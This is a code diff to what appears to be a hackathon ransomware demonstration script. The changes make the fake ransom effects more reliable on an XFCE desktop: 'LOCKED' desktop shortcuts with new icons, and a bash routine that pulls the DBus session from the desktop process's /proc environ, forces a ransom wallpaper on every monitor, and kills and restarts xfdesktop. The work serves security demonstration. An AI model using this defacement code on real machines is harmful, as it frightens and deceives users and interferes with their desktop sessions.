@@ -14,11 +14,17 @@ This is a VISUAL DEMONSTRATION for a security research hackathon.
 """
 
 import os
-import sys
-import shutil
+import shlex
 import subprocess
 import struct
+import sys
 import zlib
+
+# Absolute paths — XFCE resolves themed names inconsistently in minimal images
+_ICON_WARN = "/usr/share/icons/Humanity/status/48/dialog-warning.svg"
+_ICON_FOLDER = "/usr/share/icons/Humanity/places/48/folder.svg"
+_ICON_BROWSER = "/usr/share/icons/Humanity/apps/48/web-browser.svg"
+_ICON_MAIL = "/usr/share/icons/Humanity/categories/48/applications-mail.svg"
 
 # ------------------------------------------------------------------ #
 # Ransom note — customizable via CLI argument or env var              #
@@ -130,10 +136,10 @@ def hijack_desktop_shortcuts():
 
     # Ransom shortcuts (open ransom note in a terminal so it always works in the container)
     templates = [
-        ("NARA__READ_ME.desktop", "!!! READ ME — RANSOM !!!", "dialog-warning"),
-        ("NARA__FILES_LOCKED.desktop", "Documents — LOCKED", "folder"),
-        ("NARA__BROWSER_LOCKED.desktop", "Browser — LOCKED", "web-browser"),
-        ("NARA__MAIL_LOCKED.desktop", "Mail — LOCKED", "internet-mail"),
+        ("NARA__READ_ME.desktop", "!!! READ ME — RANSOM !!!", _ICON_WARN),
+        ("NARA__FILES_LOCKED.desktop", "Documents — LOCKED", _ICON_FOLDER),
+        ("NARA__BROWSER_LOCKED.desktop", "Browser — LOCKED", _ICON_BROWSER),
+        ("NARA__MAIL_LOCKED.desktop", "Mail — LOCKED", _ICON_MAIL),
     ]
     for fname, title, icon in templates:
         path = os.path.join(DESKTOP, fname)
@@ -197,43 +203,59 @@ def _create_ransom_wallpaper():
 
 
 def change_wallpaper():
-    """Set the XFCE desktop wallpaper to the ransom image."""
+    """
+    Set the XFCE desktop wallpaper. Requires DBus (xfconf) — docker exec without a session
+    often fails; when run as DISPLAY=:1 python3 ... from the exploiter, this script runs
+    with dbus-launch below so all monitor/workspace backdrops update.
+    """
+    wallpaper = _create_ransom_wallpaper()
+    print(f"[RANSOMWARE] Wallpaper image created → {wallpaper}")
+    wp = shlex.quote(wallpaper)
+
+    # Must use the SAME dbus session as the running XFCE desktop, otherwise
+    # xfconf-query writes to a new session that xfdesktop never reads.
+    # Then kill+restart xfdesktop to force the wallpaper refresh.
+    script = f"""
+set -e
+export DISPLAY="${{DISPLAY:-:1}}"
+
+# Inherit the dbus session from the running xfce4-session process
+XFCE_PID=$(pgrep -o xfce4-session 2>/dev/null || true)
+if [ -n "$XFCE_PID" ] && [ -r /proc/$XFCE_PID/environ ]; then
+  eval $(cat /proc/$XFCE_PID/environ 2>/dev/null | tr '\\0' '\\n' | grep DBUS_SESSION_BUS_ADDRESS)
+  export DBUS_SESSION_BUS_ADDRESS
+fi
+
+# If we still don't have a dbus address, fall back to feh only
+if [ -z "$DBUS_SESSION_BUS_ADDRESS" ]; then
+  feh --bg-fill {wp} 2>/dev/null || true
+  exit 0
+fi
+
+# Set wallpaper for all monitors/workspaces
+for key in $(xfconf-query -c xfce4-desktop -l 2>/dev/null | grep last-image || true); do
+  xfconf-query -c xfce4-desktop -p "$key" -s {wp} 2>/dev/null || true
+done
+
+# Kill and restart xfdesktop so it picks up the new wallpaper
+pkill xfdesktop 2>/dev/null || true
+sleep 1
+xfdesktop &
+sleep 1
+
+# Also use feh on root window as belt-and-suspenders
+feh --bg-fill {wp} 2>/dev/null || true
+"""
     try:
-        wallpaper = _create_ransom_wallpaper()
-        print(f"[RANSOMWARE] Wallpaper image created → {wallpaper}")
-
-        os.environ.setdefault("DISPLAY", ":1")
-
-        # Find the correct XFCE wallpaper property (monitor name varies)
-        try:
-            props = subprocess.run(
-                ["xfconf-query", "-c", "xfce4-desktop", "-l"],
-                capture_output=True, text=True, timeout=5
-            )
-            for line in props.stdout.splitlines():
-                if "last-image" in line:
-                    subprocess.run(
-                        ["xfconf-query", "-c", "xfce4-desktop", "-p", line.strip(), "-s", wallpaper],
-                        capture_output=True, timeout=5
-                    )
-            print("[RANSOMWARE] Wallpaper changed via xfconf-query")
-            return
-        except Exception:
-            pass
-
-        # Try feh as fallback
-        result = subprocess.run(
-            ["feh", "--bg-fill", wallpaper],
-            capture_output=True, text=True, timeout=10
+        r = subprocess.run(
+            ["bash", "-c", script],
+            capture_output=True,
+            text=True,
+            timeout=45,
         )
-        if result.returncode == 0:
-            print("[RANSOMWARE] Wallpaper changed via feh")
-            return
-
-        print("[RANSOMWARE] Wallpaper file ready — VNC may need to refresh to show change")
-
-    except FileNotFoundError:
-        print("[RANSOMWARE] xfconf-query/feh not available — wallpaper change skipped")
+        if r.returncode != 0 and r.stderr:
+            print(f"[RANSOMWARE] Wallpaper script stderr: {r.stderr[:500]}")
+        print("[RANSOMWARE] Wallpaper applied (xfconf + xfdesktop + feh)")
     except subprocess.TimeoutExpired:
         print("[RANSOMWARE] Wallpaper command timed out")
     except Exception as e:
